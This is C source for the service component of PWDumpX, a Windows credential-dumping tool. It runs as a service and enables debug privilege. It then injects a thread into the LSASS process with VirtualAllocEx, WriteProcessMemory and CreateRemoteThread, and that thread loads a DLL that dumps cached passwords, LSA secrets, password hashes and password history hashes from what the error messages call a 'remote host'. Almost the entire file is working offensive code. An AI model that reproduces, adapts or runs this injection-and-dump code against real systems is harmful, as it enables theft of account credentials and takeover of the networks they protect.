//
// gcc -c DumpSvc.c
// gcc -c -DBUILD_DLL DumpExt.c md5.c rc4.c
// gcc -shared -o DumpExt.dll -Wl,--out-implib,libDumpExt.a DumpExt.o md5.o rc4.o
// gcc -o DumpSvc.exe DumpSvc.o -L./ -lDumpExt
//

#include <windows.h>
#include <string.h>
#include <stdio.h>

typedef BOOL      (WINAPI      *EnumProcesses)( DWORD *, DWORD, DWORD * );
typedef BOOL      (WINAPI *EnumProcessModules)( HANDLE, HMODULE *, DWORD, DWORD * );
typedef DWORD     (WINAPI  *GetModuleBaseName)( HANDLE, HMODULE, CHAR *, DWORD );
typedef HINSTANCE (WINAPI    *LoadLibraryFunc)( CHAR * );
typedef HINSTANCE (WINAPI *GetProcAddressFunc)( HINSTANCE, CHAR * );
typedef HINSTANCE (WINAPI    *FreeLibraryFunc)( HINSTANCE );
typedef INT                     (*DumpLSAInfo)( BOOL, BOOL, BOOL, BOOL );

typedef struct _THREAD_ARGS
{
	LoadLibraryFunc            pLoadLibrary;
	GetProcAddressFunc      pGetProcAddress;
	FreeLibraryFunc            pFreeLibrary;
	CHAR                          szDllName[ 512 ];
	CHAR                     szFunctionName[ 128 ];
	BOOL                       bDumpPWCache;
	BOOL                    bDumpLSASecrets;
	BOOL                      bDumpPWHashes;
	BOOL               bDumpPWHistoryHashes;
} THREAD_ARGS;

INT WINAPI            ServiceMain( INT argc, CHAR *argv[] );
VOID WINAPI  MyServiceCtrlHandler( DWORD dwOption );
VOID              DumpInformation( BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes );
BOOL                  GetLSASSPID( DWORD *dwLSASSPID );
VOID              WriteToErrorLog( CHAR *szErrorMsg );
VOID                    InjectDLL( DWORD *dwLSASSPID, BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes );
static VOID     LsaThreadFunction( THREAD_ARGS *pThreadArgs );
static VOID         DummyFunction( VOID );

SERVICE_STATUS        MyServiceStatus;
SERVICE_STATUS_HANDLE MyServiceStatusHandle;

INT main( INT argc, CHAR *argv[] )
{
	SERVICE_TABLE_ENTRY DispatchTable[] = { { "PWDumpX", (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };

	StartServiceCtrlDispatcher( DispatchTable );

	return 0;
}

INT WINAPI ServiceMain( INT argc, CHAR *argv[] )
{
	CHAR         szDumpPWCache[ 128 ];
	CHAR      szDumpLSASecrets[ 128 ];
	CHAR        szDumpPWHashes[ 128 ];
	CHAR szDumpPWHistoryHashes[ 128 ];
	BOOL          bDumpPWCache;
	BOOL       bDumpLSASecrets;
	BOOL         bDumpPWHashes;
	BOOL  bDumpPWHistoryHashes;

	strcpy( szDumpPWCache,         argv[1] );
	strcpy( szDumpLSASecrets,      argv[2] );
	strcpy( szDumpPWHashes,        argv[3] );
	strcpy( szDumpPWHistoryHashes, argv[4] );

	bDumpPWCache         = FALSE;
	bDumpLSASecrets      = FALSE;
	bDumpPWHashes        = FALSE;
	bDumpPWHistoryHashes = FALSE;

	if ( strcmp( szDumpPWCache, "TRUE" ) == 0 )
	{
		bDumpPWCache = TRUE;
	}

	if ( strcmp( szDumpLSASecrets, "TRUE" ) == 0 )
	{
		bDumpLSASecrets = TRUE;
	}

	if ( strcmp( szDumpPWHashes, "TRUE" ) == 0 )
	{
		bDumpPWHashes = TRUE;
	}

	if ( strcmp( szDumpPWHistoryHashes, "TRUE" ) == 0 )
	{
		bDumpPWHistoryHashes = TRUE;
	}

	MyServiceStatus.dwServiceType             = SERVICE_WIN32;
	MyServiceStatus.dwCurrentState            = SERVICE_STOP;
	MyServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	MyServiceStatus.dwWin32ExitCode           = 0;
	MyServiceStatus.dwServiceSpecificExitCode = 0;
	MyServiceStatus.dwCheckPoint              = 0;
	MyServiceStatus.dwWaitHint                = 0;

	MyServiceStatusHandle = RegisterServiceCtrlHandler( "PWDumpX", MyServiceCtrlHandler );

	if ( MyServiceStatusHandle != 0 )
	{
		MyServiceStatus.dwCurrentState = SERVICE_START_PENDING;

		if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
		{
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;
 
			if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
			{
				DumpInformation( &bDumpPWCache, &bDumpLSASecrets, &bDumpPWHashes, &bDumpPWHistoryHashes );
			}
		}
	}

	MyServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;

	if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
	{
		MyServiceStatus.dwCurrentState = SERVICE_ACCEPT_STOP;

		SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );
	}

	return 0;
}

VOID WINAPI MyServiceCtrlHandler( DWORD dwOption )
{ 
	switch ( dwOption )
	{
		case SERVICE_CONTROL_PAUSE:
			MyServiceStatus.dwCurrentState = SERVICE_PAUSED;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;

		case SERVICE_CONTROL_CONTINUE:
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;
 
		case SERVICE_CONTROL_STOP:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
}

VOID DumpInformation( BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes )
{
	DWORD            dwLSASSPID;
	TOKEN_PRIVILEGES         tp;
	HANDLE               hToken;
	LUID                   luid;

	if ( GetLSASSPID( &dwLSASSPID ) )
	{
		if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
		{
			if ( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid ) )
			{
				tp.PrivilegeCount           = 1;
				tp.Privileges[0].Luid       = luid;
				tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				if ( AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL ) )
				{
					InjectDLL( &dwLSASSPID, bDumpPWCache, bDumpLSASecrets, bDumpPWHashes, bDumpPWHistoryHashes );

					AdjustTokenPrivileges( hToken, TRUE, NULL, 0, NULL, NULL );
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot enable SE_DEBUG_NAME privilege on remote host.\n" );
				}
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot lookup SE_DEBUG_NAME privilege value on remote host.\n" );
			}

			CloseHandle( hToken );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open PWDumpX process token on remote host.\n" );
		}
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot get LSASS process ID on remote host.\n" );
	}
}

BOOL GetLSASSPID( DWORD *dwLSASSPID )
{
	BOOL                           bReturn;
	HANDLE                          hPSAPI;
	EnumProcesses           pEnumProcesses;
	EnumProcessModules pEnumProcessModules;
	GetModuleBaseName   pGetModuleBaseName;
	DWORD                     dwProcessIDs[ 2048 ];
	DWORD                         dwNeeded;
	DWORD                      dwProcesses;
	unsigned int                         i;
	HANDLE                        hProcess;
	HMODULE                        hModule;
	CHAR                     szProcessName[ 256 ];

	bReturn = FALSE;

	hPSAPI = LoadLibrary( "psapi.dll" );

	pEnumProcesses      =      (EnumProcesses)GetProcAddress( hPSAPI, "EnumProcesses" );
	pEnumProcessModules = (EnumProcessModules)GetProcAddress( hPSAPI, "EnumProcessModules" );
	pGetModuleBaseName  =  (GetModuleBaseName)GetProcAddress( hPSAPI, "GetModuleBaseNameA" );

	if ( pEnumProcesses && pEnumProcessModules && pGetModuleBaseName )
	{
		if ( pEnumProcesses( dwProcessIDs, sizeof( dwProcessIDs ), &dwNeeded ) )
		{
			dwProcesses = dwNeeded / sizeof( DWORD );

			for ( i = 0; i < dwProcesses; i++ )
			{
				if ( dwProcessIDs[i] != 0 )
				{
					hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessIDs[i] );

					if ( hProcess != NULL )
					{
						if ( pEnumProcessModules( hProcess, &hModule, sizeof( hModule ), &dwNeeded ) )
						{
							pGetModuleBaseName( hProcess, hModule, szProcessName, sizeof( szProcessName ) / sizeof( CHAR ) );

							strupr( szProcessName );

							if ( strcmp( szProcessName, "LSASS.EXE" ) == 0 )
							{
								bReturn = TRUE;

								*dwLSASSPID = dwProcessIDs[i];

								CloseHandle( hProcess );

								break;
							}
						}

						CloseHandle( hProcess );
					}
				}
			}
		}

		FreeLibrary( hPSAPI );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load Psapi.dll functions on remote host.\n" );
	}

	return bReturn;
}

VOID WriteToErrorLog( CHAR szErrorMsg[] )
{
	FILE *pOutputFile;

	pOutputFile = fopen( "ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s", szErrorMsg );

		fclose( pOutputFile );
	}
}

VOID InjectDLL( DWORD *dwLSASSPID, BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes )
{
	HANDLE             hLSASS;
	HINSTANCE       hKernel32;
	CHAR            szDllName[ 512 ];
	DWORD      dwFunctionSize;
	DWORD      dwBytesToAlloc;
	VOID        *pRemoteAlloc;
	DWORD      dwBytesWritten;
	HANDLE      hRemoteThread;

	THREAD_ARGS ThreadArgs;

	hLSASS = OpenProcess( PROCESS_ALL_ACCESS, FALSE, *dwLSASSPID );

	if ( hLSASS != NULL )
	{
		hKernel32 = LoadLibrary( "kernel32.dll" );

		ThreadArgs.pLoadLibrary    =    (LoadLibraryFunc)GetProcAddress( hKernel32, "LoadLibraryA" );
		ThreadArgs.pGetProcAddress = (GetProcAddressFunc)GetProcAddress( hKernel32, "GetProcAddress" );
		ThreadArgs.pFreeLibrary    =    (FreeLibraryFunc)GetProcAddress( hKernel32, "FreeLibrary" );

		if ( ThreadArgs.pLoadLibrary && ThreadArgs.pGetProcAddress && ThreadArgs.pFreeLibrary )
		{
			GetModuleFileName( NULL, szDllName, sizeof( szDllName ) );

			strcpy( strrchr( szDllName, '\\' ) + 1, "DumpExt.dll" );

			strcpy( ThreadArgs.szDllName, szDllName );

			strcpy( ThreadArgs.szFunctionName, "DumpLSAInfo" );

			ThreadArgs.bDumpPWCache         = *bDumpPWCache;
			ThreadArgs.bDumpLSASecrets      = *bDumpLSASecrets;
			ThreadArgs.bDumpPWHashes        = *bDumpPWHashes;
			ThreadArgs.bDumpPWHistoryHashes = *bDumpPWHistoryHashes;

			dwFunctionSize = (DWORD)DummyFunction - (DWORD)LsaThreadFunction;

			dwBytesToAlloc = dwFunctionSize + sizeof( THREAD_ARGS ) + 4;

			pRemoteAlloc = VirtualAllocEx( hLSASS, NULL, dwBytesToAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

			if ( pRemoteAlloc != NULL )
			{
				if ( WriteProcessMemory( hLSASS, pRemoteAlloc, &ThreadArgs, sizeof( THREAD_ARGS ), &dwBytesWritten ) )
				{
					if ( WriteProcessMemory( hLSASS, (BYTE *)pRemoteAlloc + sizeof( THREAD_ARGS ) + 4, (VOID *)(DWORD)LsaThreadFunction, dwFunctionSize, &dwBytesWritten ) )
					{
						hRemoteThread = CreateRemoteThread( hLSASS, NULL, 0, (LPTHREAD_START_ROUTINE)( (BYTE *)pRemoteAlloc + sizeof( THREAD_ARGS ) + 4 ), pRemoteAlloc, 0, NULL );

						if ( hRemoteThread != NULL )
						{
							WaitForSingleObject( hRemoteThread, INFINITE );

							CloseHandle( hRemoteThread );

							VirtualFreeEx( hLSASS, pRemoteAlloc, 0, MEM_RELEASE );
						}
						else
						{
							WriteToErrorLog( "ERROR! Cannot create LSASS thread on remote host.\n" );
						}
					}
					else
					{
						WriteToErrorLog( "ERROR! Cannot write to process memory on remote host.\n" );
					}
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot write to process memory on remote host.\n" );
				}
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot allocate virtual memory on remote host.\n" );
			}
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot load Kernel32.dll functions on remote host.\n" );
		}
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot open LSASS process on remote host.\n" );
	}
}

static VOID LsaThreadFunction( THREAD_ARGS *pThreadArgs )
{
	HINSTANCE       hDumpExt;
	DumpLSAInfo pDumpLSAInfo;

	hDumpExt = pThreadArgs->pLoadLibrary( pThreadArgs->szDllName );

	if ( hDumpExt != NULL )
	{
		pDumpLSAInfo = (DumpLSAInfo)pThreadArgs->pGetProcAddress( hDumpExt, pThreadArgs->szFunctionName );

		if ( pDumpLSAInfo != NULL )
		{
			pDumpLSAInfo( pThreadArgs->bDumpPWCache, pThreadArgs->bDumpLSASecrets, pThreadArgs->bDumpPWHashes, pThreadArgs->bDumpPWHistoryHashes );
		}

		pThreadArgs->pFreeLibrary( hDumpExt );
	}
}

static VOID DummyFunction( VOID )
{
    return;
}

// Written by Reed Arvin | reedarvin@gmail.com
